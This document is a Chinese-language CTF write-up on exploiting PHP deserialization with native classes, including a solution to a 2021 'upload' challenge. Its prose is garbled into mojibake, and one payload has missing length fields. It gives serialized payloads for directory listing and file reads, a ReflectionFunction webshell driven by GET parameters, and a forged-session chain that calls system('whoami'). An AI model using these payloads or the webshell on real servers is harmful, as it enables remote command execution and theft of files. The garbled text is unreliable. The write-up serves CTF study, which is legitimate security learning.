æˆ‘ä»¬ä»ååºåˆ—åŒ–çš„__wakeup()å‡½æ•°å…¥æ‰‹ï¼Œçœ‹åˆ°æ–°å»ºäº†ä¸€ä¸ªCçš„ç±»å¯¹è±¡ï¼Œç„¶åä½¿ç”¨Cç±»é‡Œé¢çš„check()æ–¹æ³•å¯¹$paraå’Œ$classè¿™ä¸¤ä¸ªå±æ€§è¿›è¡Œæ£€æŸ¥ï¼Œçœ‹æ˜¯å¦å­˜åœ¨éæ³•çš„å­—ç¬¦ï¼Œæ²¡æœ‰é—®é¢˜ä¹‹åå°±ä½¿ç”¨echo new $this-&gt;class ($this-&gt;para);è¯­å¥å°†æ–°å»ºç±»è¿”å›çš„å†…å®¹è¾“å‡ºã€‚ ç›®å½•éå†ç±» é¦–å…ˆåˆ©ç”¨DirectoryIteratoræˆ–FilesystemIteratorç±»å»éå†ç›®æ ‡çš„Webç›®å½•ï¼š &lt;?php class A{ public $class='FilesystemIterator'; // FilesystemIterator(\"/var/www/html\") public $para=\"/var/www/html/\"; public $check; } $poc = new A(); echo serialize($poc); å¾—åˆ°payloadï¼š O:1:\"A\":3:{s:5:\"class\";s:18:\"FilesystemIterator\";s:4:\"para\";s:14:\"/var/www/html/\";s:5:\"check\";N;} æ‰§è¡Œåå¾—åˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹ aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE ç»§ç»­å¾€ä¸‹æ‰¾: &lt;?php class A{ public $class='FilesystemIterator'; // FilesystemIterator(\"/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE\") public $para=\"/var/www/html/\"; public $check; } $poc = new A(); echo serialize($poc); åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹æ‰¾åˆ°äº†flag.php æ–‡ä»¶è¯»å–ç±» ç„¶åæˆ‘ä»¬ä½¿ç”¨ SplFileObject ç±»è¯»å–flag.phpå°±è¡Œäº†ï¼š &lt;?php class A{ public $class='SplFileObject'; // SplFileObject(\"/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php\") public $para=\"/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php\"; public $check; } $poc = new A(); echo serialize($poc); å¾—åˆ°payloadï¼š O:1:\"A\":3:{s:5:\"class\";s:13:\"SplFileObject\";s:4:\"para\";s:55:\"/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php\";s:5:\"check\";N;} 10.8 åå°„ç±»Reflection å®ƒå¯ä»¥åœ¨ PHP è¿è¡ŒçŠ¶æ€ä¸­ï¼Œæ‰©å±•åˆ†æ PHP ç¨‹åºï¼Œå¯¼å‡ºæˆ–æå–å‡ºå…³äºç±»ã€æ–¹æ³•ã€å±æ€§ã€å‚æ•°ç­‰çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ³¨é‡Šã€‚è¿™ç§åŠ¨æ€è·å–çš„ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•çš„åŠŸèƒ½ç§°ä¸ºåå°„APIã€‚ ReflectionMethod ç±»è·å–ç±»æ–¹æ³•çš„ç›¸å…³ä¿¡æ¯ ReflectionMethod ç±»æŠ¥å‘Šäº†ä¸€ä¸ªæ–¹æ³•çš„æœ‰å…³ä¿¡æ¯ã€‚ReflectionMethod ç±»ä¸­æœ‰å¾ˆå¤šç»§æ‰¿æ–¹æ³•å¯ä»¥ä½¿ç”¨ï¼Œæ¯”å¦‚è¿™ä¸ª getDocComment() æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å®ƒæ¥è·å–ç±»ä¸­å„ä¸ªå‡½æ•°æ³¨é‡Šå†…å®¹ example: &lt;?php class FlagIsHere { /** * è¿™æ˜¯æµ‹è¯•æ–¹æ³• * flag{success} * @return int */ protected function GiveMeFlag() { return 9999; } } $ref = new ReflectionMethod('FlagIsHere','GiveMeFlag'); var_dump($ref-&gt;getDocComment()); è¾“å‡ºï¼š ReflectionClassç±»è¯»å–ç±»çš„å±æ€§å’Œæ–¹æ³•å ReflectionClass ç±»æŠ¥å‘Šäº†ä¸€ä¸ªç±»çš„æœ‰å…³ä¿¡æ¯ã€‚å…¶ä¸­åˆå§‹åŒ–æ–¹æ³•èƒ½å¤Ÿè¿”å›ç±»çš„å®ä¾‹ã€‚ public ReflectionClass::__construct(mixed $argument) $argumentï¼šæ—¢å¯ä»¥æ˜¯åŒ…å«ç±»åçš„å­—ç¬¦ä¸²ï¼ˆstringï¼‰ä¹Ÿå¯ä»¥æ˜¯å¯¹è±¡ï¼ˆobjectï¼‰ã€‚ ç”¨æ³•å¦‚ä¸‹ exampleï¼š æŠŠç±»é‡Œé¢å±æ€§å’Œæ–¹æ³•çš„åå­—éƒ½èƒ½å¤Ÿæ˜¾ç¤ºå‡ºæ¥ã€‚ ReflectionFunctionç±»å†™Webshell ReflectionFunction ç±»æŠ¥å‘Šäº†ä¸€ä¸ªå‡½æ•°çš„æœ‰å…³ä¿¡æ¯ã€‚å…¶ä¸­invokeArgs()æ–¹æ³•èƒ½å¤Ÿç”¨æ¥å†™Webshellã€‚ public ReflectionFunction::invokeArgs(array $args): mixed $argsï¼šä¼ é€’ç»™å‡½æ•°çš„å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œåƒcall_user_func_array()çš„å·¥ä½œæ–¹å¼ã€‚ example: &lt;?php function title($title, $name) { return sprintf(\"%s. %s\\r \", $title, $name); } $function = new ReflectionFunction('title'); echo $function-&gt;invokeArgs(array('Dr', 'Phil')); ?&gt; æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–¹æ³•æ¥å†™Webshellï¼š &lt;?php $func = new ReflectionFunction($_GET[m]); echo $func-&gt;invokeArgs(array($_GET[c])); ?&gt; [çº¢å¸½æ¯ 2021 final]upload ç”±äºçº¿ä¸‹æ˜¯AWDplusçš„æ¨¡å¼ï¼Œéœ€è¦æŒ–æ´å¹¶ä¸”ä¿®æ´ï¼Œç›´æ¥ç»™å‡ºäº†æºç ï¼Œæœ‰3ä¸ªæ–‡ä»¶ã€‚ class.php &lt;?php session_start(); function red($fileinfo){ foreach($fileinfo as $key =&gt; $value){ $path = $value; $name = $key; } echo \"&lt;a style='color:#ff6347' href='$path'&gt;$name&lt;/a&gt; \"; return $name; } function green($fileinfo){ foreach($fileinfo as $key =&gt; $value){ $path = $value; $name = $key; } echo \"&lt;a style='color:#32cd32' href='$path'&gt;$name&lt;/a&gt; \"; return $name; } class file{ public $path; function __construct($path) { $this-&gt;path = $path; } function __toString() { return basename($this-&gt;path); } } index.php &lt;?php include('class.php'); if(!(isset($_SESSION['func']))) { $_SESSION['func'] = 'showfile'; } if(!(isset($_SESSION['files']))) { $_SESSION['files'] = array(); } if(!(isset($_SESSION['paths']))) { $_SESSION['paths'] = array(); } if(isset($_POST['filename'])&amp;&amp;isset($_POST['content'])){ if(stristr($_POST['filename'], 'h')){ die('no h!'); } $filepath = './files/'.$_POST['filename']; $filename = basename($_POST['filename']); file_put_contents($filepath,$_POST['content']); $_SESSION['files'][$filename] = $filepath; $_SESSION['paths'][$filepath] = 'file'; header('Location:/?file='.$filename); } ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;upload&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; &lt;h3&gt;upload your file below&lt;/h3&gt; &lt;form action=\"index.php\" method=\"post\"&gt; &lt;input type=\"text\" name=\"filename\" value=\"filename\" style=\"width: 600px;\"&gt; &lt;/br&gt; &lt;/br&gt; &lt;textarea type=\"text\" name=\"content\" style=\"width: 600px;height: 300px;\" &gt;&lt;/textarea&gt; &lt;/br&gt; &lt;input type=\"submit\" value=\"submit\"&gt; &lt;/form&gt; &lt;h4&gt;beatiful front&lt;/h4&gt; &lt;/div&gt; &lt;?php if(rand(0,2)&gt;1){ $showfile = 'red'; } else{ $showfile ='green'; } $filelist = array(); foreach ($_SESSION['paths'] as $path=&gt;$class){ $temp = new $class($path); if($class=='file'){ $filelist[] = (string)$temp; } else{ $filelist[] = $temp; } } $out = '&lt;p&gt;your file:'; foreach ($filelist as $value){ $out .= $value.' '; } echo $out.'&lt;/p&gt;'; if(isset($_GET['file'])){ if(isset($_SESSION['files'][$_GET['file']])) { //GETæ–¹æ³•è¯»å–æ–‡ä»¶åï¼Œä»sessionçš„æ–‡ä»¶åå­—é‡Œé¢å¯»æ‰¾ $pathinfo = array($_GET['file']=&gt;$_SESSION['files'][$_GET['file']]); ${$_SESSION['func']}($pathinfo); } else{ echo 'no such file!'; } } ?&gt; &lt;/body&gt; &lt;/html&gt; info.php &lt;?php phpinfo(); åˆ†æé¢˜ç›® é¦–å…ˆæ˜¯indexé¡µé¢ è¿™é‡Œèƒ½å¤Ÿè®©ç”¨æˆ·å¡«å†™æ–‡ä»¶çš„æ–‡ä»¶åå’Œå†…å®¹ï¼Œç„¶åæäº¤ï¼Œæäº¤çš„æ–‡ä»¶æ­£å¸¸æƒ…å†µä¸‹ä¼šä¿å­˜åœ¨./filesç›®å½•ä¸‹ï¼Œçœ‹ä¸€ä¸‹åå°æ˜¯æ€ä¹ˆå¯¹æ–‡ä»¶è¿›è¡Œæ“ä½œçš„ï¼š if(isset($_POST['filename'])&amp;&amp;isset($_POST['content'])){ if(stristr($_POST['filename'], 'h')){ // å¯¹æ–‡ä»¶åæœ‰hå­—ç¬¦çš„è¿›è¡Œè¿‡æ»¤ die('no h!'); } $filepath = './files/'.$_POST['filename']; // è¿™é‡Œå¯ä»¥ç›®å½•ç©¿è¶Š $filename = basename($_POST['filename']); // basename()å‡½æ•°è·å–æ–‡ä»¶åå­— file_put_contents($filepath,$_POST['content']); é€šè¿‡åˆ†æå¯ä»¥å‘ç°æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶å­˜åœ¨ç›®å½•ç©¿è¶Šçš„é—®é¢˜ï¼Œæˆ‘ä»¬èƒ½é€šè¿‡filename=../xxxxè¿™ç§æ–¹å¼å°†æ–‡ä»¶ä¿å­˜çš„è·¯å¾„ç©¿è¶Šåˆ°æœåŠ¡å™¨çš„ä»»æ„è·¯å¾„ä¸‹ï¼Œä½†æ˜¯ç”±äºå­˜åœ¨å¯¹æ–‡ä»¶åhå­—ç¬¦çš„è¿‡æ»¤ï¼Œå› æ­¤æ— æ³•ç›´æ¥ä¼ ä¸€ä¸ªphpæ–‡ä»¶åˆ°ç½‘ç«™æ ¹ç›®å½•ä¸‹æ‰§è¡Œï¼Œå¾—å¦å¯»åƒ»å¾„ã€‚ .user.iniï¼ˆæ— æœï¼‰ æ—¢ç„¶è¿‡æ»¤æ‰äº†hå­—ç¬¦ï¼Œæ„å‘³ç€.htaccessè¿™æ ·çš„ä¿®æ”¹é…ç½®æ–‡ä»¶æ„å‘³ç€è¡Œä¸é€šï¼Œä½†æ˜¯æˆ‘æƒ³èµ·äº†å¦å¤–ä¸€ä¸ªä¿®æ”¹é…ç½®çš„æ–‡ä»¶.user.iniã€‚.user.iniå’Œ.htaccessä¸€æ ·æ˜¯å¯¹å½“å‰ç›®å½•çš„æ‰€ä»¥phpæ–‡ä»¶çš„é…ç½®è®¾ç½®ï¼Œå³å†™äº†.user.iniå’Œå®ƒåŒç›®å½•çš„æ–‡ä»¶ä¼šä¼˜å…ˆä½¿ç”¨.user.iniä¸­è®¾ç½®çš„é…ç½®å±æ€§ã€‚ ä½†æ˜¯ä¸æ˜¯php.iniä¸­çš„æ¯ä¸ªå˜é‡éƒ½èƒ½é€šè¿‡ini_set()æˆ–è€….user.iniå’Œ.htaccessæ¥è®¾ç½®ï¼Œç®€å•çš„æ¥è¯´æ¯ä¸ªå˜é‡æœ‰å®ƒæ‰€å±äºçš„æ¨¡å¼ï¼Œä¸‹é¢å®˜æ–¹æ‰‹å†Œçš„å››ä¸ªæ¨¡å¼ é€šè¿‡ä¸Šè¡¨ï¼Œçœ‹åˆ°PHP_INI_USERæ¨¡å¼ä¸­æåˆ°ï¼Œå¯ä»¥åœ¨.user.iniä¸­è®¾å®šã€‚ä½†å®é™…ä¸Šï¼Œåªè¦ä¸æ˜¯PHP_INI_SYSTEMæ¨¡å¼ä¸‹çš„å±æ€§ï¼Œå‡å¯ä»¥åœ¨.user.iniä¸­è®¾ç½®ã€‚ é‚£é…ç½®æ–‡ä»¶åº”è¯¥æ€ä¹ˆå†™å‘¢ï¼Œè¿™é‡Œæœ‰å®˜æ–¹çš„é…ç½®é€‰é¡¹åˆ—è¡¨ï¼šphp.ini é…ç½®é€‰é¡¹åˆ—è¡¨ åœ¨æ–‡ä»¶ä¸Šä¼ çš„é¢˜ç›®ä¸­ï¼Œæˆ‘ä»¬åªéœ€è®°ä½è¿™ä¸¤ä¸ªé€‰é¡¹å³å¯ï¼š auto_prepend_file = xxx // åœ¨æ¯ä¸ªæ–‡ä»¶å¤´æ·»åŠ ä¸ŠæŒ‡å®šæ–‡ä»¶çš„å†…å®¹ï¼Œç›¸å½“äºinclude(xxx) user_ini.cache_ttl = xx // è®¾ç½®é…ç½®çš„ç”Ÿæ•ˆæ—¶é—´ï¼Œé»˜è®¤300ç§’ äºæ˜¯æˆ‘ä»¬å°±æƒ³æ˜¯å¦èƒ½å¤Ÿé€šè¿‡ä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ï¼Œç„¶åå†ç›®å½•ç©¿è¶Šå°†.user.iniä¸Šä¼ åˆ°ç½‘ç«™æ ¹ç›®å½•ä¸‹ï¼Œå†…å®¹æ˜¯è®©å…¶ä»–æ–‡ä»¶éƒ½åŒ…å«è¿™ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œä»è€Œå®ç°getshellï¼Œä½†æ˜¯å°è¯•äº†å¾ˆå¤šæ¬¡éƒ½æ— æœï¼Œç”±æ­¤çŒœæµ‹è¿è¡Œçš„æ¨¡å¼æ˜¯PHP_INI_SYSTEMå¯¼è‡´äº†.user.iniæ— æ³•ç”Ÿæ•ˆã€‚ SplFileObjectç±»è¯»æ–‡ä»¶ æ¯”èµ›çš„æ—¶å€™åšåˆ°è¿™é‡Œå…¶å®å·²ç»æ²¡æ€è·¯äº†ï¼ˆè¿˜æ˜¯é¢˜ç›®åˆ·å¾—å°‘å•Šï¼‰ï¼Œèµ›åçœ‹æœ‰é€šè¿‡SplFileObject ç±»æ¥è¯»æ–‡ä»¶å¾—æ€è·¯ï¼Œé‚£å…ˆå¾—äº†è§£ä¸€ä¸‹SplFileObject ç±»æ˜¯ä¸ªä»€ä¹ˆç©æ„ã€‚ SplFileInfo ç±»ä¸ºå•ä¸ªæ–‡ä»¶çš„ä¿¡æ¯æä¾›äº†ä¸€ä¸ªé«˜çº§çš„é¢å‘å¯¹è±¡çš„æ¥å£ï¼Œå¯ä»¥ç”¨äºå¯¹æ–‡ä»¶å†…å®¹çš„éå†ã€æŸ¥æ‰¾ã€æ“ä½œç­‰ã€‚è¯¦æƒ…è¯·å‚è€ƒï¼šhttps://www.php.net/manual/zh/class.splfileobject.php è¯¥ç±»çš„æ„é€ æ–¹æ³•å¯ä»¥æ„é€ ä¸€ä¸ªæ–°çš„æ–‡ä»¶å¯¹è±¡ç”¨äºåç»­çš„è¯»å–ã€‚ æˆ‘ä»¬å¯ä»¥åƒç±»ä¼¼ä¸‹é¢è¿™æ ·å»è¯»å–ä¸€ä¸ªæ–‡ä»¶çš„ä¸€è¡Œï¼š &lt;?php $context = new SplFileObject('/etc/passwd'); echo $context; // è¾“å‡º root:x:0:0:root:/root:/bin/bash ä½†æ˜¯è¿™æ ·ä¹Ÿåªèƒ½è¯»å–ä¸€è¡Œï¼Œè¦æƒ³å…¨éƒ¨è¯»å–çš„è¯è¿˜éœ€è¦å¯¹æ–‡ä»¶ä¸­çš„æ¯ä¸€è¡Œå†…å®¹è¿›è¡Œéå†ï¼š &lt;?php $context = new SplFileObject('/etc/passwd'); foreach($context as $f){ echo($f); } sessionååºåˆ—åŒ– é‚£ä¹ˆæˆ‘ä»¬çŸ¥é“äº†è¿™ä¸ªç±»ä¹‹åæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Œä¼¼ä¹æ‰¾ä¸åˆ°å¯ä»¥ç”¨çš„åœ°æ–¹å•Šï¼Œæƒ³æƒ³æ–‡ä»¶ä¸­æ˜¯ä¸æ˜¯è¿˜æœ‰ä¸€ä¸ªæ–‡ä»¶æˆ‘ä»¬éƒ½æ²¡ç”¨ä¸Šï¼Œå…¶ä¸­å¿…ç„¶è—æœ‰è§£é¢˜çš„å…³é”®ã€‚ $_SESSION['files'][$filename] = $filepath; // å°†å¸¦æœ‰è·¯å¾„çš„æ–‡ä»¶åå­—ä½œä¸ºé”®ï¼Œæ–‡ä»¶è·¯å¾„ä½œä¸ºå€¼ $_SESSION['paths'][$filepath] = 'file'; // å°†æ–‡ä»¶ç›®å½•ä½œä¸ºé”®ï¼Œ'file'ä½œä¸ºå€¼ header('Location:/?file='.$filename); } è¿™é‡ŒæŠŠæ–‡ä»¶çš„åå­—å’Œè·¯å¾„éƒ½å­˜åˆ°äº†SESSIONé‡Œé¢ï¼Œä½†æ˜¯æˆ‘ä»¬èƒ½å¤Ÿçœ‹åˆ°$_SESSION['paths'][$filepath]çš„å€¼æ˜¯è¢«å†™æ­»äº†ï¼Œæˆ‘ä»¬æ— æ³•æ§åˆ¶ï¼Œç„¶åæ¥ç€å¾€ä¸‹çœ‹ $filelist = array(); foreach ($_SESSION['paths'] as $path=&gt;$class){ // å°†æ¯ä¸€ä¸ªæ–‡ä»¶çš„è·¯å¾„èµ‹å€¼ç»™$path,å°†'file'èµ‹å€¼ç»™$class $temp = new $class($path); // ç›¸å½“äºnew file(æ–‡ä»¶çš„è·¯å¾„) if($class=='file'){ // å­˜åœ¨$classä¸ç­‰äºfileçš„æƒ…å†µå—ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ $filelist[] = (string)$temp; //å°†è¿”å›çš„æ–‡ä»¶åèµ‹å€¼ç»™åˆ—è¡¨ } else{ $filelist[] = $temp; } } $out = '&lt;p&gt;your file:'; foreach ($filelist as $value){ $out .= $value.' '; //ä»åˆ—è¡¨ä¸­è¯»å–è¾“å‡ºæ–‡ä»¶å } echo $out.'&lt;/p&gt;'; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œä»$_SESSION['paths']æ•°ç»„é‡Œé¢æŠŠæ¯ä¸€ä¸ªé”®ï¼ˆæ–‡ä»¶çš„è·¯å¾„ï¼‰èµ‹å€¼ç»™$path,å°†å€¼'file'èµ‹å€¼ç»™$classï¼Œç„¶åé‡ç‚¹å°±æ¥äº†ï¼Œè¿™é‡Œç”¨åŠ¨æ€è°ƒç”¨çš„æ–¹æ³•æ–°å»ºäº†ä¸€ä¸ªç±»å¯¹è±¡ï¼Œçœ‹åˆ°è¿™é‡Œæ˜¯ä¸æ˜¯è§‰å¾—å¾ˆå¥‡æ€ªï¼Œåœ¨ä¸Šä¸€æ®µä»£ç ä¸­ï¼Œå·²ç»æŠŠæ¯ä¸€ä¸ª$_SESSION['paths']çš„å€¼å·²ç»å†™æ­»äº†ä¸º'file'äº†ï¼Œä¸ºä»€ä¹ˆè¿™é‡Œè¦åŠ¨æ€è°ƒç”¨è€Œä¸æ˜¯ç›´æ¥new file($path)è¿™ç§æ›´ç›´æ¥çš„æ–¹å¼å‘¢ï¼Œè¿™é‡Œå¾ˆæ˜æ˜¾æœ‰é—®é¢˜ã€‚æ¥ç€å¾€ä¸‹çœ‹ï¼Œè¿™é‡Œåˆç”¨if()æ¥åˆ¤æ–­$classçš„å€¼æ˜¯å¦æ˜¯'file'ï¼Œè¿™å°±æ›´åŠ æ˜æ˜¾äº†äº†ï¼Œ$classçš„å€¼å¿…ç„¶åˆçŒ«è…»ï¼Œçœ‹å›ä»£ç ï¼Œæœ€åæ˜¯å°†æ–°å»ºçš„ç±»å¯¹è±¡èµ‹å€¼ç»™ä¸€ä¸ªä¸´æ—¶å˜é‡ï¼Œç„¶åå†é€šè¿‡å¾ªç¯è¾“å‡ºæ¯ä¸€ä¸ªå€¼ï¼Œçœ‹åˆ°è¿™é‡Œæ˜¯ä¸æ˜¯æœ‰ç‚¹ç†Ÿæ‚‰ï¼Œè¿™ä¸å°±æ˜¯SplFileObjectç±»éœ€è¦å¾ªç¯æ¥è¾“å‡ºæ¯ä¸€è¡Œçš„å€¼å—ï¼Ÿäºæ˜¯è¿™é‡Œå‡ ä¹èƒ½è‚¯å®šæ˜¯é€šè¿‡å°†$classçš„å€¼å˜æˆSplFileObjectï¼Œæ¥è·å–æ–‡ä»¶çš„å†…å®¹ã€‚ æ—¢ç„¶æ˜¯è¯»å–SESSIONçš„å†…å®¹ï¼Œé‚£æˆ‘æ˜¯å¦èƒ½å¤Ÿæ”¹å˜SESSIONçš„å†…å®¹å‘¢ï¼Ÿç»“åˆæˆ‘ä»¬ç›®å½•ç©¿è¶Šçš„æ¼æ´ï¼Œå®é™…ä¸Šå¦‚æœæˆ‘ä»¬çŸ¥é“SESSIONä¿å­˜çš„è·¯å¾„å’ŒSESSIONåºåˆ—åŒ–çš„æ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å®é™…ä¸Šå¯ä»¥ç›´æ¥ä¸Šä¼ ä¸€ä¸ªSESSIONæ–‡ä»¶åˆ°æŒ‡å®šçš„ç›®å½•ä¸­ï¼Œæ§åˆ¶SESSIONçš„å†…å®¹ï¼Œæ‰€ä»¥æœ€åä¸€ä¸ªinfo.phpæ–‡ä»¶å°±æ˜¯è®©æˆ‘ä»¬çœ‹SESSIONä¿å­˜çš„è·¯å¾„å’Œåºåˆ—åŒ–æ–¹æ³•çš„ã€‚ æ¥ç€å°±æ˜¯æ„é€ æˆ‘ä»¬çš„SESSIONåºåˆ—åŒ–åçš„æ–‡ä»¶ paths|a:1:{s:5:\"/flag\";s:13:\"SplFileObject\";} è¿™é‡Œçš„é”®ä¸º/flagå¯¹åº”ä»£ç ä¸­çš„$pathï¼Œå€¼ä¸ºSplFileObjectå¯¹åº”$classï¼Œç»„åˆèµ·æ¥å°±æ˜¯SplFileObject('/flag')ã€‚ç„¶åæ–‡ä»¶åéœ€è¦ç›®å½•ç©¿è¶Šåˆ°/tmp/sess_[SSIDçš„å€¼] funcæ˜¯ä¸€ä¸ªå˜é‡ï¼Œå¹¶æœªèµ‹å€¼ï¼Œfileså˜é‡æœ‰ä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­é”®å€¼filenameå¯¹åº”./files/filenameï¼Œåé¢çš„pathsåŒç† è¿™é‡Œæ‡µé€¼äº†åŠå¤©ï¼Œæˆ‘ä»¥ä¸ºä½œè€…æƒ³é PHPåºåˆ—åŒ–å¼•æ“ååºåˆ—åŒ–è¾“å…¥çš„contentï¼Œå¼„åŠå¤©åªæ˜¯å°†å†…å®¹æ’å…¥sessionæ–‡ä»¶ä¸­ï¼Œè¿™æ ·ç”±äºä»–æ˜¯phpåºåˆ—åŒ–å¼•æ“ï¼Œå°†|çœ‹åšé”®å€¼åˆ†éš”ç¬¦ï¼Œè¿™æ ·å°±pathåšä¸ºkeyï¼Œåé¢æ˜¯å€¼ï¼Œé‚£è¿™ä¸€åˆ‡å°±è¯´é€šäº†â€¦ï¼Œä¸æˆ‘æ‰€è§ä¸åŒçš„æ˜¯ï¼Œä»–è¿™å·²ç»æ˜¯ç›®å½•ç©¿è¶Šè¿›å…¥åˆ°sessionæ–‡ä»¶ä¸­äº†ï¼Œå› æ­¤ä»–postå†™çš„å†…å®¹å°±ç›´æ¥æ’å…¥sessionæ–‡ä»¶ï¼Œå¹¶ä¸ä¼šè¢«åºåˆ—åŒ–å¤„ç†ï¼ˆå—¯ï¼Œå¤§æ¦‚æ˜¯è¿™æ ·å§ï¼‰ ReflectionFunctionåå°„ç±» è¿™é‡Œæ˜¯å¦å¤–ä¸€ä¸ªèƒ½åˆ©ç”¨çš„ç±»ï¼Œè¿™ä¸ªç±»èƒ½å¤Ÿç›´æ¥å†™shellï¼Œæ¯”ä¸Šé¢çš„åªèƒ½è¯»æ–‡ä»¶æ›´åŠ ç‰›é€¼ã€‚è¿™ä¹Ÿåº”è¯¥æ˜¯é¢„æœŸè§£ï¼Œé¢˜ç›®ä¸­æ‰€æœ‰çš„ä»£ç éƒ½ç”¨ä¸Šäº†ã€‚ ç½‘ä¸Šèƒ½å¤Ÿæœå‡ºæ¥CTFä¸­çš„ç”¨æ³•æ˜¯ï¼š &lt;?php $func = new ReflectionFunction($_GET[m]); echo $func-&gt;invokeArgs(array($_GET[c])); ?&gt; é‚£è¿™é“é¢˜é‡Œé¢è¯¥æ€ä¹ˆç”¨è¿™ä¸ªç±»å‘¢ï¼Œç”±äºè¦ç”¨åˆ°è¿™ä¸ªç±»é‡Œé¢çš„invokeArgs()è¿™æ–¹æ³•ï¼Œå› æ­¤è¦ç”¨åˆ°æ•°ç»„å»åŠ¨æ€è°ƒç”¨ç±»é‡Œé¢çš„æ–¹æ³•ã€‚ exampleï¼š class Test{ public function hello($name) { echo \"hello \".$name; } } $t = new Test(); $a = array(0 =&gt; $t,1 =&gt; \"hello\"); $a('john'); // è¾“å‡ºhello john è¿™é‡Œç”¨æ•°ç»„çš„ç¬¬ä¸€ä¸ªä½ç½®çš„å€¼æ˜¯å®ä¾‹åŒ–åçš„ç±»ï¼Œç¬¬äºŒä¸ªä½ç½®çš„å€¼æ˜¯ç±»çš„æ–¹æ³•åï¼Œå› æ­¤æˆ‘ä»¬è¦çš„æ˜¯ï¼š $function = new ReflectionFunction('system'); $a = array(0 =&gt; $function,1 =&gt; \"invokeArgs\"); $b = array(0 =&gt; 'whoami'); $a($b); å…ˆå®ä¾‹åŒ–ReflectionFunctionç±»å¯¹è±¡ï¼Œç„¶åå†æ„é€ å‡ºè¿™ä¸¤ä¸ªæ•°ç»„ï¼Œæœ€åæ‰¾åˆ°ä¸€ä¸ªèƒ½å¤ŸåŠ¨æ€è°ƒç”¨çš„åœ°æ–¹ã€‚ å†çœ‹å›é¢˜ç›®ï¼Œæˆ‘ä»¬åœ¨ä¹‹å‰çš„åˆ†æä¸­å·²ç»èƒ½å®ç°èƒ½å¤Ÿå®ä¾‹åŒ–è‡ªå·±æƒ³è¦çš„ç±»äº†ã€‚ paths|a:1:{s::\"system\";s::\"ReflectionFunction\";} é‚£æ€ä¹ˆæ„é€ å‡ºç¬¬ä¸€ä¸ªæ•°ç»„å‘¢ï¼Œå†çœ‹å›è¿™æ®µä»£ç ï¼š $filelist = array(); foreach ($_SESSION['paths'] as $path=&gt;$class){ // å°†æ¯ä¸€ä¸ªæ–‡ä»¶çš„è·¯å¾„èµ‹å€¼ç»™$path,å°†'file'èµ‹å€¼ç»™$class $temp = new $class($path); // ç›¸å½“äºnew file(æ–‡ä»¶çš„è·¯å¾„) if($class=='file'){ // å­˜åœ¨$classä¸ç­‰äºfileçš„æƒ…å†µå—ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ $filelist[] = (string)$temp; //å°†è¿”å›çš„æ–‡ä»¶åèµ‹å€¼ç»™åˆ—è¡¨ } else{ $filelist[] = $temp; } } è¿™é‡Œå·²ç»ä¸ºæˆ‘ä»¬å‡†å¤‡å¥½äº†ä¸€ä¸ª$filelistæ•°ç»„ï¼Œåœ¨æ„é€ ReflectionFunctionç±»å¯¹è±¡çš„æ—¶å€™ç”±äº$classä¸ç­‰äºå­—ç¬¦ä¸²'file'ï¼Œå› æ­¤æ˜¯ç›´æ¥æ”¾è¿›äº†æ•°ç»„ä¸­ï¼Œç„¶åæ•°ç»„ç¬¬äºŒä½æˆ‘ä»¬éœ€è¦æ˜¯'invokeArgs'è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è®©$class='file'åŒæ—¶è®©$path='invokeArgs'ï¼Œè¿™æ ·å°±èƒ½å¤Ÿè¿”å›ä¸€ä¸²å­—ç¬¦ä¸²æ·»åŠ è¿›æ•°ç»„é‡Œé¢ï¼Œä»è€Œå®Œæˆç¬¬ä¸€ä¸ªæ•°ç»„çš„æ„é€ ï¼ paths|a:2:{s:6:\"system\";s:18:\"ReflectionFunction\";s:10:\"invokeArgs\";s:4:\"file\";} å¾—åˆ°$filelist = array(0 =&gt; $temp,1 =&gt; \"invokeArgs\"); æ¥ä¸‹æ¥å°±æ˜¯æ„é€ ç¬¬äºŒä¸ªæ•°ç»„ï¼Œå’ŒåŠ¨æ€è°ƒç”¨ç±»æ–¹æ³•ã€‚ if(isset($_GET['file'])){ if(isset($_SESSION['files'][$_GET['file']])) { //GETæ–¹æ³•è¯»å–æ–‡ä»¶åï¼Œä»sessionçš„æ–‡ä»¶åå­—é‡Œé¢å¯»æ‰¾ $pathinfo = array($_GET['file']=&gt;$_SESSION['files'][$_GET['file']]); // æ„é€ æ•°ç»„ ${$_SESSION['func']}($pathinfo); // åŠ¨æ€è°ƒç”¨ï¼ï¼ } else{ echo 'no such file!'; } } å¯ä»¥çœ‹åˆ°$pathinfoè¿™é‡Œä¸ºæˆ‘ä»¬æ„é€ äº†ä¸€ä¸ªæ•°ç»„ï¼Œå¹¶ä¸”æ•°ç»„çš„é”®æ˜¯ä»GETæ–¹æ³•è·å–çš„ï¼Œè€Œå€¼åˆæ˜¯ä»SESSIONä¸­çš„filesæ•°ç»„é‡Œé¢æ‰¾çš„ï¼Œå› æ­¤æˆ‘ä»¬åŒæ ·èƒ½å¤Ÿæ§åˆ¶ã€‚ files|a:1:{i:0;s:6:\"whoami\";} 